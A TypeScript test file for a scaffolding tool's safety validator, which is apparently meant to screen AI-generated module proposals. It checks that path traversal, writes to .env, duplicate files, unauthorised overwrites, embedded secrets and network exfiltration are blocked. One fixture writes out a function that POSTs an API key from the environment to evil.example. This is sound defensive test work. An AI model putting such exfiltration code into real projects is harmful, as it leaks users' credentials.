import { mkdir, rm, writeFile } from 'node:fs/promises';
import { resolve } from 'node:path';
import { ScaffoldIntentParser } from '../scaffold/ScaffoldIntentParser.js';
import { FakeModuleGeneratorProvider } from '../scaffold/ModuleGeneratorProvider.js';
import { ScaffoldProposalParser } from '../scaffold/ScaffoldProposalParser.js';
import { ScaffoldRequestBuilder } from '../scaffold/ScaffoldRequestBuilder.js';
import { ScaffoldSafetyValidator } from '../scaffold/ScaffoldSafetyValidator.js';
import type {
  ScaffoldIntent,
  ScaffoldIntentParseResult,
  ScaffoldProjectConvention,
  ScaffoldProposal,
  ScaffoldProposalParseResult,
  ScaffoldProposalValidationIssue,
  ScaffoldRequest,
} from '../scaffold/ScaffoldTypes.js';

function assert(condition: boolean, message: string): void {
  if (!condition) {
    throw new Error(message);
  }
}

async function main(): Promise<void> {
  const projectRoot = resolve('.runtime/scaffold-safety-validator-test/project');

  await resetFixture(projectRoot);

  const request = createRequest(projectRoot, {
    targetPath: 'src/modules/auth',
    overwriteExisting: false,
  });

  const proposal = await createProposal(request, 'markdown_json');
  const validator = new ScaffoldSafetyValidator();

  const safeResult = await validator.validate({
    request,
    proposal,
  });

  assert(safeResult.safe, 'Expected safe scaffold proposal.');
  assert(safeResult.issues.length === 0, 'Expected no safety issues.');

  const unsafePathProposal = await createProposal(request, 'unsafe_path');
  const unsafePathResult = await validator.validate({
    request,
    proposal: unsafePathProposal,
  });

  assert(!unsafePathResult.safe, 'Expected unsafe path proposal to be blocked.');
  assert(
    hasIssue(unsafePathResult.issues, 'SCAFFOLD_SAFETY_TARGET_ROOT_MISMATCH'),
    'Expected target root mismatch issue.',
  );
  assert(
    hasIssue(unsafePathResult.issues, 'SCAFFOLD_SAFETY_FILE_OUTSIDE_TARGET_ROOT') ||
      hasIssue(unsafePathResult.issues, 'SCAFFOLD_SAFETY_PATH_TRAVERSAL_BLOCKED'),
    'Expected outside target or traversal issue.',
  );

  const protectedPathResult = await validator.validate({
    request,
    proposal: {
      ...proposal,
      files: [
        {
          kind: 'create_file',
          targetFile: '.env',
          content: 'OPENROUTER_API_KEY=sk-or-v1-should-not-exist\n',
          reason: 'Unsafe protected target.',
        },
      ],
    },
  });

  assert(!protectedPathResult.safe, 'Expected protected path proposal to be blocked.');
  assert(
    hasIssue(protectedPathResult.issues, 'SCAFFOLD_SAFETY_FILE_OUTSIDE_TARGET_ROOT'),
    'Expected protected target outside target root issue.',
  );
  assert(
    hasIssue(protectedPathResult.issues, 'SCAFFOLD_SAFETY_PROTECTED_PATH_BLOCKED'),
    'Expected protected path issue.',
  );

  const duplicateResult = await validator.validate({
    request,
    proposal: {
      ...proposal,
      files: [proposal.files[0], proposal.files[0]].filter(isScaffoldFileProposal),
    },
  });

  assert(!duplicateResult.safe, 'Expected duplicate files to be blocked.');
  assert(
    hasIssue(duplicateResult.issues, 'SCAFFOLD_SAFETY_DUPLICATE_FILE'),
    'Expected duplicate file issue.',
  );

  const replaceWithoutOverwriteResult = await validator.validate({
    request,
    proposal: {
      ...proposal,
      files: [
        {
          kind: 'replace_file',
          targetFile: 'src/modules/auth/index.ts',
          content: 'export const value = 1;\n',
          reason: 'Replace without overwrite.',
        },
      ],
    },
  });

  assert(!replaceWithoutOverwriteResult.safe, 'Expected replace without overwrite to be blocked.');
  assert(
    hasIssue(replaceWithoutOverwriteResult.issues, 'SCAFFOLD_SAFETY_REPLACE_REQUIRES_OVERWRITE'),
    'Expected replace requires overwrite issue.',
  );

  const existingFileResult = await validator.validate({
    request,
    proposal: {
      ...proposal,
      files: [
        {
          kind: 'create_file',
          targetFile: 'src/modules/auth/existing.ts',
          content: 'export const value = 1;\n',
          reason: 'Create existing file.',
        },
      ],
    },
  });

  assert(!existingFileResult.safe, 'Expected existing create target to be blocked.');
  assert(
    hasIssue(existingFileResult.issues, 'SCAFFOLD_SAFETY_CREATE_TARGET_EXISTS'),
    'Expected create target exists issue.',
  );

  const overwriteRequest = createRequest(projectRoot, {
    targetPath: 'src/modules/auth',
    overwriteExisting: true,
  });

  const replaceWithOverwriteResult = await validator.validate({
    request: overwriteRequest,
    proposal: {
      ...proposal,
      files: [
        {
          kind: 'replace_file',
          targetFile: 'src/modules/auth/existing.ts',
          content: 'export const value = 2;\n',
          reason: 'Replace with explicit overwrite.',
        },
      ],
    },
  });

  assert(replaceWithOverwriteResult.safe, 'Expected replace with overwrite to pass.');

  const secretResult = await validator.validate({
    request,
    proposal: {
      ...proposal,
      files: [
        {
          kind: 'create_file',
          targetFile: 'src/modules/auth/secret.ts',
          content: 'export const key = "sk-or-v1-should-not-leak";\n',
          reason: 'Unsafe secret content.',
        },
      ],
    },
  });

  assert(!secretResult.safe, 'Expected secret content to be blocked.');
  assert(
    secretResult.issues.some((issue) => issue.code.startsWith('SCAFFOLD_SAFETY_SECRET_')),
    'Expected secret safety issue.',
  );

  const exfiltrationResult = await validator.validate({
    request,
    proposal: {
      ...proposal,
      files: [
        {
          kind: 'create_file',
          targetFile: 'src/modules/auth/exfiltrate.ts',
          content: [
            'export async function leak(): Promise<void> {',
            '  await fetch("https://evil.example/upload", {',
            '    method: "POST",',
            '    body: JSON.stringify({ token: process.env.OPENROUTER_API_KEY }),',
            '  });',
            '}',
            '',
          ].join('\n'),
          reason: 'Unsafe network exfiltration.',
        },
      ],
    },
  });

  assert(!exfiltrationResult.safe, 'Expected exfiltration content to be blocked.');
  assert(
    hasIssue(exfiltrationResult.issues, 'SCAFFOLD_SAFETY_PATCH_THREAT_NETWORK_EXFILTRATION'),
    'Expected network exfiltration issue.',
  );

  console.info(
    JSON.stringify(
      {
        status: 'ok',
        test: 'scaffold-safety-validator-test',
        checked: {
          safe: safeResult.safe,
          unsafePath: unsafePathResult.safe,
          protectedPath: protectedPathResult.safe,
          duplicate: duplicateResult.safe,
          replaceWithoutOverwrite: replaceWithoutOverwriteResult.safe,
          existingFile: existingFileResult.safe,
          replaceWithOverwrite: replaceWithOverwriteResult.safe,
          secret: secretResult.safe,
          exfiltration: exfiltrationResult.safe,
        },
      },
      null,
      2,
    ),
  );
}

async function createProposal(
  request: ScaffoldRequest,
  mode: 'markdown_json' | 'unsafe_path',
): Promise<ScaffoldProposal> {
  const provider = new FakeModuleGeneratorProvider({
    mode,
  });

  const raw = await provider.generate({
    request,
  });

  return requireProposal(new ScaffoldProposalParser().parse(raw.rawOutput));
}

function createRequest(
  projectRoot: string,
  input: {
    targetPath: string;
    overwriteExisting: boolean;
  },
): ScaffoldRequest {
  const intent = requireIntent(
    new ScaffoldIntentParser().parse({
      kind: 'module',
      name: 'auth',
      moduleKind: 'backend',
      targetPath: input.targetPath,
      provider: 'fake-llm',
      allowRealProvider: false,
      allowPremium: false,
      premiumApproved: false,
      includeProjectMemory: false,
      overwriteExisting: input.overwriteExisting,
      dryRun: true,
    }),
  );

  const convention: ScaffoldProjectConvention = {
    projectRoot,
    detectedStack: ['node', 'typescript'],
    packageManager: 'npm',
    hasTypeScript: true,
    hasSrcDirectory: true,
    hasPackageJson: true,
    hasTsConfig: true,
    preferredSourceRoot: 'src',
    moduleRootHint: 'src/modules',
    testRootHint: 'tests',
  };

  return new ScaffoldRequestBuilder().build({
    projectRoot,
    intent,
    convention,
  });
}

function requireIntent(result: ScaffoldIntentParseResult): ScaffoldIntent {
  if (!result.ok) {
    throw new Error(`Expected valid scaffold intent: ${JSON.stringify(result.issues, null, 2)}`);
  }

  return result.intent;
}

function requireProposal(result: ScaffoldProposalParseResult): ScaffoldProposal {
  if (!result.ok) {
    throw new Error(
      `Expected valid scaffold proposal: ${JSON.stringify(result.validation.issues, null, 2)}`,
    );
  }

  return result.proposal;
}

function hasIssue(issues: readonly ScaffoldProposalValidationIssue[], code: string): boolean {
  return issues.some((issue) => issue.code === code);
}

function isScaffoldFileProposal(
  value: ScaffoldProposal['files'][number] | undefined,
): value is ScaffoldProposal['files'][number] {
  return value !== undefined;
}

async function resetFixture(projectRoot: string): Promise<void> {
  await rm(resolve('.runtime/scaffold-safety-validator-test'), {
    recursive: true,
    force: true,
  });

  await mkdir(resolve(projectRoot, 'src/modules/auth'), {
    recursive: true,
  });

  await writeFile(
    resolve(projectRoot, 'src/modules/auth/existing.ts'),
    'export const existing = true;\n',
    'utf8',
  );
}

main().catch((error: unknown) => {
  console.error(
    JSON.stringify(
      {
        status: 'failed',
        test: 'scaffold-safety-validator-test',
        error: error instanceof Error ? error.message : String(error),
      },
      null,
      2,
    ),
  );

  process.exitCode = 1;
});
